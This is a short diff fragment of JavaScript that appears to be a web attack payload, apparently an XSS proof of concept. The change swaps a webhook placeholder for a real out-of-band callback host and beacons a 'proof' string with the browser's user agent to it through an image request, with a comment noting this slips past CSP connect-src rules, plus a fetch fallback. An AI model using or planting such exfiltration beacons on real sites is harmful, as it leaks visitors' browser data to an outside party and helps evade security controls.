@@ -17,7 +17,7 @@
     "|ua=" + navigator.userAgent;
 
   // Beacon 1: image GET (survives most CSP connect-src configs; no CORS needed)
-  try { new Image().src = "https://{WEBHOOK_URL}/b?" + encodeURIComponent(proof); } catch (e) {}
+  try { new Image().src = "https://j1lyucxvd6v9kdpuk4u75cy8wz2qqge5.oastify.com/b?" + encodeURIComponent(proof); } catch (e) {}
 
   // Beacon 2: fetch fallback
   try {
